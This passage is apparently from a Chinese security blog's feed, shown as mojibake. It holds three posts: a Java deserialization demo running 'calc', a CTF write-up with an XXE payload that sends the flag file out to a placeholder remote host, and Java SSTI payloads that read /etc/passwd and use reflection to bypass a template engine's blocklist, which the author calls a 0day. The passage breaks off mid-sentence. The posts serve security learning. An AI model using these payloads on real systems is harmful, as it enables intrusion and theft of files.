class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051416583311.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”±äºæ˜¯å­—èŠ‚ç ï¼Œç›´æ¥æ‰“å¼€æ˜¯ä¹±ç ã€‚<br><img src="https://img-blog.csdnimg.cn/20200514165909506.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”¨vscodeæ’ä»¶<code>hexdump</code>æŸ¥çœ‹ç”Ÿæˆçš„æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/20200514170059910.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ–è€…ä½¿ç”¨<code>SerializationDumper.jar</code>å·¥å…·ï¼Œæ•ˆæœå¦‚ä¸‹éƒ¨åˆ†æˆªå›¾ã€‚<br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">https://github.com/NickstaDB/SerializationDumper</a><br><img src="https://img-blog.csdnimg.cn/2020051417045964.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>&emsp;&emsp; è¿™ä¸ªDEMOä¸­å®ç°äº†ç¬”è€…å‰æ–‡æ‰€æåŠåˆ°çš„ä¸‰è¦ç´ ï¼Œä½†ä¼¼ä¹ä½ è¿˜çœ‹ä¸å‡ºæ¥æ¼æ´çš„å­˜åœ¨çš„åœ°æ–¹ã€‚</p><hr><h2 id="æ¼æ´DEMO"><a href="#æ¼æ´DEMO" class="headerlink" title="æ¼æ´DEMO"></a>æ¼æ´DEMO</h2><p>&emsp;&emsp; ä¸‹é¢ä¼šä»¥ä¸€ä¸ªå­˜åœ¨çš„æ¼æ´demoï¼Œå¸¦ä½ æ›´è¿›ä¸€æ­¥ç†è§£Javaååºåˆ—åŒ–çš„å±å®³ã€‚<br><strong>æ¼æ´æºç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerabilityClass</span> <span class="keyword">implements</span> <span class="title">summer</span>.<span class="title">serializable</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">5550839108669505813L</span>;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// åŠ å…¥æ‰§è¡Œå‘½ä»¤ä»£ç </span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çœç•¥setã€getæ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"VulnerabilityClass&#123;"</span> +</span><br><span class="line">                <span class="string">"username='"</span> + username + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", password='"</span> + password + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", date="</span> + date +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerabilityClass</span><span class="params">(String username, String password, Date date, Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ©ç”¨</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// è°ƒç”¨åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">        Serilizable();</span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">        UnSerializable();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serilizable</span><span class="params">()</span></span>&#123;</span><br><span class="line">        VulnerabilityClass clazz = <span class="keyword">new</span> VulnerabilityClass();</span><br><span class="line">        clazz.setDate(<span class="keyword">new</span> Date());</span><br><span class="line">        clazz.setId(<span class="number">1314520</span>);</span><br><span class="line">        clazz.setPassword(<span class="string">"summer6666"</span>);</span><br><span class="line">        clazz.setUsername(<span class="string">"summer"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å†™æ–‡ä»¶</span></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">            oos.writeObject(clazz);</span><br><span class="line">            System.out.println(<span class="string">"serilizable: "</span> + clazz);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">UnSerializable</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"tempFile3"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">            VulnerabilityClass clazz = (VulnerabilityClass) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">"unserializable: "</span> + clazz);</span><br><span class="line">            ois.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> VulnerabilityClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200516145552671.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>æ¼æ´æˆå› åˆ†æ</strong></p><p>&emsp;&emsp; åœ¨æ¼æ´æºç ä¸­çš„<code>readObject()</code>æ–¹æ³•ï¼Œç¬¬ä¸€è¡Œæ˜¯é»˜è®¤çš„ååºåˆ—åŒ–æ–¹æ³•<code>defaultReadObject()</code>ï¼Œä½†æ˜¯ä¸‹é¢ä¸€è¡Œæ˜¯æ·»åŠ äº†<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼Œè™½ç„¶è¿™é‡Œç®€å•ç²—æš´çš„å°†æ‰§è¡Œå‘½ä»¤çš„ä»£ç å†™å…¥äº†æ–¹æ³•ã€‚å®é™…çš„æƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜æ˜¯ä¸ä¼šè¿™ä¹ˆåšï¼Œç¬”è€…è¿™é‡Œç®€å•å±•ç¤ºä¸€ä¸‹æ¼æ´åŸç†ã€‚å®é™…æƒ…å†µéƒ½æ˜¯æ”»å‡»è€…é€šè¿‡å„ç§ä¼ªé€ æ–¹æ³•ã€ä¿®æ”¹ã€é‡å®šä¹‰ç­‰æ–¹æ³•æœ€ååˆ°è¾¾æ‰§è¡Œå‘½ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="comment">// åŠ å…¥æ‰§è¡Œå‘½ä»¤ä»£ç </span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; ååºåˆ—åŒ–æ¼æ´ä¸‰è¦ç´ å®ç°<code>Serializabe</code>æ¥å£ã€<code>readObject()</code>ã€<code>writeObject()</code>æ–¹æ³•ï¼Œç¼ºä¸€ä¸å¯ã€‚ä½†è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœç”¨æˆ·æ§åˆ¶äº†<code>readObject</code>äº¦æˆ–è€…æ˜¯<code>writeObject</code>æ–¹æ³•ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥é€ æˆååºåˆ—åŒ–æ¼æ´å‘¢ï¼Ÿå…¶å®ä¹Ÿæœ‰ä¸€ä¸ªé—®é¢˜æ§åˆ¶ä¸äº†<code>writeObject</code>æ–¹æ³•ï¼Œå› ä¸ºå…¶åœ¨æœåŠ¡å™¨å†…ï¼Œæˆ–è€…æ˜¯Javaåº”ç”¨å†…ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å»ä¿®æ”¹å†…éƒ¨ä»£ç ã€‚æ‰€ä»¥è¯´åªèƒ½é€šè¿‡æ§åˆ¶<code>readObject</code>æ–¹æ³•ï¼Œè¿™é‡Œçš„æ§åˆ¶å¾—æ‰“åŒå¼•å·ã€‚é—®é¢˜æ¥äº†ï¼Œå‰äººå¤§ä½¬ä»¬å·²ç»ç ”ç©¶å‡ºæ¥è®¸å¤šæ§åˆ¶æ–¹æ³•ï¼Œç»å…¸<code>AnnotationInvocationHandler</code>å’Œ<code>BadAttributeValueExpException</code>ç±»å‡æ»¡è¶³æ¡ä»¶ï¼Œä¸‹ç¯‡æ–‡ç« å¸¦ä½ åˆ†æã€‚<br>&emsp;&emsp; å¦‚æœè¦æ·±å…¥ç†è§£ååºåˆ—åŒ–æ¼æ´å¯ä»¥å»å­¦ä¹ ååºåˆ—åŒ–åˆ©ç”¨å·¥å…·<code>ysoserial</code>ã€‚ç½‘ä¸Šå¾ˆå¤šååºåˆ—åŒ–æ–‡ç« åŸºæœ¬ä¸Šéƒ½æ˜¯ç ”ç©¶<code>commons-collection</code>ååºåˆ—åŒ–ï¼Œä½†å…¶å®<code>commons-colection</code>ååºåˆ—åŒ–é“¾æ˜¯å¾ˆå¤æ‚ï¼Œä¸å»ºè®®æ–°æ‰‹å°ç™½å­¦ä¹ ã€‚<code>ysoserial-Gadget-URLDNS</code>è¿™æ¡ååºåˆ—åŒ–é“¾å»ºè®®æ–°æ‰‹å°ç™½å­¦ä¹ ï¼Œæ¯”è¾ƒç®€å•ã€‚æ¨èæ–‡ç« <a href="https://samny.blog.csdn.net/article/details/105790987" target="_blank" rel="noopener">å°æ¥¼æ˜¨å¤œåˆæ˜¥é£ï¼Œä½ çŸ¥ysoserial-Gadget-URLDNSå¤šå°‘ï¼Ÿ</a>ï¼Œè¿™ç¯‡æ–‡ç« å…¨æ–¹ä½çš„è§£é‡Š<code>URLDNS</code>è¿™æ¡é“¾çš„åˆ©ç”¨ã€æˆå› ï¼Œç›¸å¯¹å…¶ä»–ä½œè€…å†™çš„æ–‡ç« åˆ†ææ›´åŠ å…¨é¢ï¼ŒåŸºæœ¬ä¸Šä½ çŸ¥é“æˆ–è€…ä¸çŸ¥é“éƒ½åœ¨æ–‡ç« é‡Œé¢ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Javaçš„ååºåˆ—åŒ–æ¼æ´æ¢ç´¢å‡ºäº†Javaå®‰å…¨çš„æ–°çºªå…ƒã€‚å¼€å‘äººå‘˜ä¸ºä»€ä¹ˆè¦ååºåˆ—åŒ–å‘¢ï¼Ÿä¼—æ‰€å‘¨çŸ¥ï¼Œç”¨æˆ·å’ŒæœåŠ¡å™¨è¿›è¡Œäº¤äº’æ—¶ï¼Œ
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020ç½‘é¼æ¯---Javaæ–‡ä»¶ä¸Šä¼ wp</title>
    <link href="https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/"/>
    <id>https://summersec.github.io/2020/05/14/2020%E7%BD%91%E9%BC%8E%E6%9D%AF---Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</id>
    <published>2020-05-14T13:27:45.000Z</published>
    <updated>2020-05-29T06:08:57.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><a href="https://samny.blog.csdn.net/article/details/104426472" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« è¯»æ‡‚Javaä»£ç å®¡è®¡ä¹‹XXE</a>çœ‹è¿‡æˆ‘è¿™ç¯‡åšå®¢åº”è¯¥ä¸éš¾ï¼Œæ²¡çœ‹è¿‡å»ºè®®åœ¨çœ‹çœ‹ã€‚</p><hr><h1 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h1><p>ä¸‹è½½äº†æ‰€æœ‰çš„classå‘ç°éœ€è¦ä¸Šä¼ xlsx poi<br>å¼€å¤´å¿…é¡»æ˜¯execl<br><img src="https://img-blog.csdnimg.cn/20200510170315420.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>æ–°å»ºexecl</li></ul><p>-1.xlsxæ–‡ä»¶ï¼Œä¿®æ”¹åç¼€åexecl<br>-1.xlsx.zipè§£å‹ã€‚<br><img src="https://img-blog.csdnimg.cn/20200510171215395.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li><p>ä¿®æ”¹[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip:8089/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020051518123493.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>é‡æ–°æ‰“åŒ…æˆ<code>excel-1.xlsx</code>ï¼Œæ–‡ä»¶åä¸€å®šä¸èƒ½é”™ã€‚</p></li><li><p>åœ¨æœåŠ¡å™¨ä¸Šæ–°å»ºä¸€ä¸ª<code>evil.etd</code>æ–‡ä»¶ã€‚<br><img src="https://img-blog.csdnimg.cn/20200510170751751.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY send SYSTEM 'http://ip:8089/%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><hr><ul><li>ç„¶åç›´æ¥ä¸Šä¼ ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨httpè®°å½•ã€‚</li></ul><p><img src="https://img-blog.csdnimg.cn/20200510170959142.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/2020051017050929.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://samny.blog.csdn.net/article/details/104426472&quot; target
      
    
    </summary>
    
    
    
      <category term="Java æ–‡ä»¶ä¸Šä¼ " scheme="https://summersec.github.io/tags/Java-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>ä»å®‰å…¨è§’åº¦è°ˆJavaåå°„æœºåˆ¶--ç»ˆç« </title>
    <link href="https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/13/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E7%BB%88%E7%AB%A0/</id>
    <published>2020-05-13T02:42:16.000Z</published>
    <updated>2020-05-13T02:30:57.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¦–å‘ï¼š<a href="https://www.sec-in.com/article/309" target="_blank" rel="noopener">https://www.sec-in.com/article/309</a><br>&emsp;&emsp; é€šè¿‡å‰ä¸¤ç« çš„äº†è§£ï¼Œå¤§å®¶å¯¹Javaåå°„æœºåˆ¶æœ‰äº†ä¸€å®šçš„è®¤çŸ¥ã€‚æœ¬ç« ä½œä¸ºåå°„ç¯‡çš„æœ€ç»ˆç« ï¼Œå¦‚æœä»ååºåˆ—åŒ–çš„å±‚é¢æ¥è¯´Javaåå°„çš„å…·ä½“å±å®³ï¼Œéœ€è¦ä¸€äº›ååºåˆ—åŒ–çš„åŸºç¡€çŸ¥è¯†ã€‚æ•…ç¬”è€…å†³å®šä»åå°„æœºåˆ¶æœ¬èº«æ¥è¯´ï¼Œå®ƒçš„ä¸€ä¸ªç»å¸¸è¢«ä½¿ç”¨çš„ç‚¹â€”Server-Side Template Injectionï¼ˆç®€ç§°SSTIï¼‰ï¼Œä¸­æ–‡åæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚</p><hr><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>&emsp;&emsp; æ¨¡æ¿å¼•æ“è¢«å¹¿æ³›åº”ç”¨äºWebåº”ç”¨ç¨‹åºä¸­ï¼Œé€šè¿‡ç½‘é¡µå’Œç”µå­é‚®ä»¶å‘ˆç°åŠ¨æ€æ•°æ®ã€‚å°†ç”¨æˆ·è¾“å…¥å†…å®¹ä¸å®‰å…¨åµŒå…¥åˆ°æ¨¡æ¿ä¸­ï¼Œå®ç°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚SSTIæå…¶å®¹æ˜“è¢«è¯¯è®¤ä¸ºæ˜¯è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ï¼Œå¤§å¤šæ•°äººç»å¸¸ä¸ä¹‹æ“¦è‚©è€Œè¿‡ã€‚ä¸XSSä¸åŒçš„æ˜¯ï¼Œæ¨¡æ¿æ³¨å…¥å¯ä»¥ç”¨äºç›´æ¥æ”»å‡»WebæœåŠ¡å™¨å†…éƒ¨ï¼Œå¹¶ç»å¸¸è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚æ¨¡æ¿æ³¨å…¥å¯ä»¥é€šè¿‡å¼€å‘äººå‘˜çš„é”™è¯¯é…ç½®ï¼Œé€šè¿‡æ•…æ„æš´éœ²æ¨¡æ¿ï¼Œå¼€å‘äººå‘˜è¯•å›¾é€šè¿‡æ¥å…¶æä¾›ä¸°å¯Œçš„åŠŸèƒ½ï¼Œå°±åƒç»´åŸºã€åšå®¢ã€è¥é”€åº”ç”¨å’Œå†…å®¹ç®¡ç†ç­‰ç³»ç»Ÿã€‚<br>&emsp;&emsp;å…ˆçœ‹é€šç”¨çš„Java SSTIçš„payloadï¼Œpayloadä¸­çš„Té€šå¸¸æ˜¯éœ€è¦å£°æ˜çš„å˜é‡ï¼Œæ¯ä¸€ä¸ªæ¨¡æ¿å¼•æ“éƒ½ä¸åŒã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä¸èƒ½å‘ç°å·²ç»å¯ä»¥çœ‹åˆ°åå°„çš„<code>â€œå½±å­â€</code>äº†ï¼Œä¸‹é¢ä¼šä»æ¯ä¸€ä¸ªæ¨¡æ¿æ¥å…·ä½“åˆ†æä»‹ç»ä»»ä½•ä½¿ç”¨åå°„ä»<code>SSTI</code>åˆ°<code>RCE</code>ã€‚</p><ol><li>è·å–ç³»ç»Ÿç¯å¢ƒå˜é‡<blockquote><p>${T(java.lang.System).getenv()}</p></blockquote></li><li>è¯»å–æ–‡ä»¶å†…å®¹<blockquote><ul><li>${T(java.lang.Runtime).getRuntime().exec(â€˜cat etc/passwdâ€™)}</li><li>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</li></ul></blockquote></li></ol><hr><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><h2 id="å‰è¨€-1"><a href="#å‰è¨€-1" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp; è¿™é‡Œæ¨¡æ¿å¼•æ“æ˜¯å›½å†…çš„æ¨¡æ¿å¼•æ“ï¼Œæ¼æ´è¿˜æœªå¿…æ”¶å½•ï¼Œæ•…æš‚ä¸å…¬å¸ƒï¼Œè¿™é‡Œåªåšå­¦ä¹ ç ”ç©¶ã€‚å¦‚æœä½ æ— æ„ä¸­æ¥è§¦è¿‡è¿™ä¸ªæ¨¡æ¿ï¼Œå¦‚æœä½ è®¤å‡ºäº†è¿™ä¸ªæ¨¡æ¿ï¼Œé‚£ä¹ˆæ­å–œä½ è·å¾—0dayä¸€æšã€‚ç¬”è€…æœ‰ä¸€ä¸ªè¯·æ±‚å¦‚æœä½ è®¤å‡ºäº†ï¼Œå°±ä¸è¦å…¬å¸ƒäº†ï¼Œ0dayä½ è‡ªå·±çŸ¥é“å°±å¥½äº†ã€‚æ­¤æ¬¾æ¨¡æ¿å¼•æ“ç¦æ­¢ä½¿ç”¨äº†<code>java.lang.Runtime</code>å’Œ<code>java.lang.ProcessBuilder</code>ç±»çš„ä½¿ç”¨ï¼Œä½¿ç”¨Javaçš„åå°„æœºåˆ¶å®Œç¾çš„bypassã€‚</p><h2 id="payloadæ„é€ "><a href="#payloadæ„é€ " class="headerlink" title="payloadæ„é€ "></a>payloadæ„é€ </h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><ol><li>æˆ‘ä»¬ä¸”çœ‹ç¬¬ä¸€è¡Œï¼ŒæŒ‰ç…§ä¸Šé¢ç»™å‡ºç®€å•æ¡ˆä¾‹æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥è¿™æ ·å­å°±å¯ä»¥äº†<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>ä½†æ˜¯ç›´æ¥String.classç›´æ¥å†™æ¨¡æ¿æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ç»§ç»­æ„é€ payloadï¼Œå°†String.classè½¬åŒ–<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>çš„å½¢å¼ï¼Œç„¶åpayloadå°±å˜æˆä¸‹é¢è¿™æ 